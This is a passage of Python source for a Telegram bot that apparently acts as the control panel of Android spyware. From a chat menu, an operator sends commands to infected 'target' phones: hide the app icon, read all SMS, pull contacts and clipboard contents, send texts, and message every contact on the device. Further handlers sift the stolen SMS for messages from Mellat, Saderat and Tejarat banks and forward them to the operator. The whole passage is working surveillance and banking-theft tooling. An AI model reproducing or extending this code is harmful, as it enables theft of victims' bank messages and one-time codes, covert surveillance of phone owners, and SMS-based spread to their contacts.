            await call.edit_message_text(f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ᴛᴏ ᴄʜᴀɴɢᴇ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ꜱᴇᴛᴛɪɴɢ ? \n/> ɴᴇᴡ ᴛᴇxᴛ : `{ftime_sms[chat_id]['text']}`" , reply_markup=confirm("firsttimesms"))
        elif data == "set_ftime_phone":
            step[chat_id] = "set_ftime_phone"
            await call.edit_message_text(f"/> ꜱᴇɴᴅ ᴛʜᴇ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ᴘʜᴏɴᴇ : ", reply_markup=backToFtime())
            temp = (await app.wait_for(call.from_user.id)).text
            if temp.startswith("09") and len(temp) == 11:
                ftime_sms[chat_id] = {"phone" : temp}
                await call.edit_message_text(
                    f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ᴛᴏ ᴄʜᴀɴɢᴇ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ꜱᴇᴛᴛɪɴɢ ? \n/> ɴᴇᴡ ᴘʜᴏɴᴇ : `{ftime_sms[chat_id]['phone']}`",
                    reply_markup=confirm("firsttimesms"))
            else:
                step[chat_id] = None
                ftime_sms[chat_id] = None
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ `{temp}` !", reply_markup=back("set_ftime_phone"))
        elif data == "disable_ftime":
            updateFirstTimeSmsPhone(chat_id , "undefined")
            updateFirstTimeSmsText(chat_id , "undefined")
            await call.edit_message_text(f"✅ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴀʙʟᴇᴅ !",
                                         reply_markup=backToFtime())
        elif data == "webviewaddress":
            step[chat_id] = "setwebview"
            await call.edit_message_text(f"/> ꜱᴇɴᴅ ᴛʜᴇ ᴡᴇʙᴠɪᴇᴡ ᴜʀʟ ᴡɪᴛʜ ʜᴛᴛᴘꜱ (ᴇ.x ʜᴛᴛᴘꜱ://ɢᴏᴏɢʟᴇ.ᴄᴏᴍ) : " , reply_markup=back("back"))
            temp = (await app.wait_for(call.from_user.id)).text
            if temp.startswith("https://") and "." in temp:
                webview[chat_id] = {"url" : temp}
                await call.edit_message_text(f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ᴛᴏ ᴄʜᴀɴɢᴇ ᴡᴇʙᴠɪᴇᴡ ᴀᴅᴅʀᴇꜱꜱ? \n/> ɴᴇᴡ ᴜʀʟ : `{webview[chat_id]['url']}`" , reply_markup=confirm("back"))
            else:
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴜʀʟ `{temp}` !" , reply_markup=back("webviewaddress"))
        elif data == "check-host":
            Thread(target=send_check_host , args=(chat_id , )).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "pingone":
            Thread(target=sendPush, args=({"action": "pingone", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "hideone":
            Thread(target=sendPush,
                   args=({"action": "hideone", "chat_id": chat_id, "androidid": android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data.startswith("open_"):
            android_ids[chat_id] = data.replace("open_" , "")
            step[chat_id] = None
            await call.edit_message_text(
                    f"/> ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ꜰᴏʀ ᴜꜱᴇ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : `{android_ids[chat_id]}`",
                    reply_markup=targetMenu())
        elif data == "sendsms":
            step[chat_id] = "sendsms"
            await call.edit_message_text(f"/> ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ᴛᴇxᴛ : " , reply_markup=back(f"open_{android_ids[chat_id]}"))
            sendsms[chat_id] = {"text" : (await app.wait_for(call.from_user.id)).text}
            await call.edit_message_text(f"/> ᴛᴇxᴛ : `{sendsms[chat_id]['text']}` \n/> ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ : " , reply_markup=back(f"open_{android_ids[chat_id]}"))
            temp = (await app.wait_for(call.from_user.id)).text
            if temp.startswith("09") and len(temp) >= 11:
                sendsms[chat_id] = {"text": sendsms[chat_id]["text"], "phone" : temp}
                await call.edit_message_text(f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ꜱᴇɴᴅ ꜱᴍꜱ ᴡɪᴛʜ ᴛᴀʀɢᴇᴛ ? \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : `{android_ids[chat_id]}` \n/> ᴛᴇxᴛ : `{sendsms[chat_id]['text']}` \n/> ᴘʜᴏɴᴇ : `{sendsms[chat_id]['phone']}`" , reply_markup=confirm(f"open_{android_ids[chat_id]}"))
            else:
                step[chat_id] = None
                sendsms[chat_id] = None
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ `{temp}` !", reply_markup=back("sendsms"))
        elif data == "allsms":
            await call.edit_message_text(f"/> ᴘʟᴇᴀꜱᴇ ꜱᴇʟᴇᴄᴛ ꜱᴍꜱ Qᴜᴇʀʏ ᴋɪɴᴅ : " , reply_markup=selectSmsQueryKind(f"open_{android_ids[chat_id]}"))

        elif data in SMS_QUERY_KINDS:
            allsms[chat_id] = data
            await call.edit_message_text(f"/> Qᴜᴇʀʏ ᴋɪɴᴅ : {allsms[chat_id]} \n/> ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ᴄᴏᴜɴᴛꜱ (-1 ꜰᴏʀ ꜱᴇʟᴇᴄᴛ ᴀʟʟ) : " , reply_markup=back("allsms"))
            temp = (await app.wait_for(call.from_user.id)).text
            if isValidCount(temp):
                Thread(target=sendPush, args=({"action": "allsms", "chat_id": chat_id , "androidid" : android_ids[chat_id] , "kind" : allsms[chat_id] , "count" : temp},)).start()
                await call.edit_message_text(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...",
                                             reply_markup=back(f"open_{android_ids[chat_id]}"))
            else:
                step[chat_id] = None
                allsms[chat_id] = None
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴄᴏᴜɴᴛ `{temp}` !", reply_markup=back("allsms"))
        elif data == "lastsms":
            Thread(target=sendPush, args=({"action": "lastsms", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "fullinfo":
            Thread(target=sendPush, args=({"action": "fullinfo", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "vibrate":
            Thread(target=sendPush, args=({"action": "vibrateone", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "normal":
            Thread(target=sendPush, args=({"action": "normalone", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "getclipboard":
            Thread(target=sendPush, args=({"action": "getclipboard", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "setclipboard":
            await call.edit_message_text(f"/> ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɴᴇᴡ ᴄʟɪᴘʙᴏᴀʀᴅ ᴛᴇxᴛ : " , reply_markup=back(f"open_{android_ids[chat_id]}"))
            Thread(target=sendPush, args=({"action": "setclipboard", "chat_id": chat_id , "androidid" : android_ids[chat_id] , "text" : (await app.wait_for(chat_id)).text},)).start()
            await call.edit_message_text(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...",
                                         reply_markup=back(f"open_{android_ids[chat_id]}"))
        elif data == "sendmessagecontacts":
            await call.edit_message_text(f"/> ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ᴛᴇxᴛ : ",
                                         reply_markup=back(f"open_{android_ids[chat_id]}"))
            temp = (await app.wait_for(call.from_user.id)).text
            if "/start" not in temp and "/set" not in temp:
                Thread(target=sendPush, args=(
                    {"action": "send_message_contect", "chat_id": chat_id, "androidid": android_ids[chat_id],
                    "text": temp},)).start()
                await call.edit_message_text(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...",
                                         reply_markup=back(f"open_{android_ids[chat_id]}"))
            else:
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴛᴇxᴛ `{temp}` !", reply_markup=back("sendmessagecontacts"))
        elif data == "allcontacts":
            Thread(target=sendPush, args=({"action": "allcontacts", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "unhideone":
            Thread(target=sendPush, args=({"action": "unhideone", "chat_id": chat_id , "androidid" : android_ids[chat_id]},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data.startswith("mellat_"):
            try:
                bankSms = "All Sms bank from Target : "
                with open(f"{data.replace('mellat_' , '')}_sms.txt" , "r" , encoding="UTF-8") as f:
                    smsFile = f.read()
                    f.close()
                for i in smsFile.split("----------------------"):
                    if "ملت" in i and "بانک" in i:
                        bankSms = bankSms + i + "\n"
                with open(f"{data.replace('mellat_' , '')}_banksms.txt" , "w+" , encoding="UTF-8") as f:
                    f.write(bankSms)
                    f.close()
                cap = f"""
/> ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ ꜰʀᴏᴍ ᴀʟʟ ꜱᴍꜱ ꜰɪʟᴇ !
/> ʙᴀɴᴋ : ملت

⚡️ ᴅᴇᴠ : @{config.dev}
"""
                await app.send_document(chat_id=chat_id , document=f"{data.replace('mellat_' , '')}_banksms.txt" , caption=cap)
            except Exception as e:
                print(e)
                await app.send_message(chat_id=chat_id , text=f"❌ ᴀɴ ᴇʀʀᴏʀ ᴇᴄᴄᴜʀᴛᴇᴅ !")
        elif data.startswith("saderat_"):
            try:
                bankSms = "All Sms bank from Target : "
                with open(f"{data.replace('saderat_', '')}_sms.txt", "r", encoding="UTF-8") as f:
                    smsFile = f.read()
                    f.close()
                for i in smsFile.split("----------------------"):
                    if "صادرات" in i and "بانک" in i:
                        bankSms = bankSms + i + "\n"
                with open(f"{data.replace('saderat_', '')}_banksms.txt", "w+", encoding="UTF-8") as f:
                    f.write(bankSms)
                    f.close()
                cap = f"""
/> ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ ꜰʀᴏᴍ ᴀʟʟ ꜱᴍꜱ ꜰɪʟᴇ !
/> ʙᴀɴᴋ : صادرت

⚡️ ᴅᴇᴠ : @{config.dev}
"""
                await app.send_document(chat_id=chat_id, document=f"{data.replace('saderat_', '')}_banksms.txt",
                                            caption=cap)
            except:
                await app.send_message(chat_id=chat_id , text=f"❌ ᴀɴ ᴇʀʀᴏʀ ᴇᴄᴄᴜʀᴛᴇᴅ !")
        elif data.startswith("tejarat_"):
            try:
                bankSms = "All Sms bank from Target : "
                with open(f"{data.replace('tejarat_', '')}_sms.txt", "r", encoding="UTF-8") as f:
                    smsFile = f.read()
                    f.close()
                for i in smsFile.split("----------------------"):
                    if "تجارت" in i and "بانک" in i:
                        bankSms = bankSms + i + "\n"
                with open(f"{data.replace('tejarat_', '')}_banksms.txt", "w+", encoding="UTF-8") as f:
                    f.write(bankSms)
                    f.close()
                cap = f"""
/> ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ ꜰʀᴏᴍ ᴀʟʟ ꜱᴍꜱ ꜰɪʟᴇ !
/> ʙᴀɴᴋ : تجارت

⚡️ ᴅᴇᴠ : @{config.dev}
        """
                await app.send_document(chat_id=chat_id, document=f"{data.replace('tejarat_', '')}_banksms.txt",
                                            caption=cap)
            except:
                await app.send_message(chat_id=chat_id , text=f"❌ ᴀɴ ᴇʀʀᴏʀ ᴇᴄᴄᴜʀᴛᴇᴅ !")
        














    except Exception as e:
        print(e)

if __name__ == "__main__":
    while True:
        try:
            app.run()
        except:
            pass
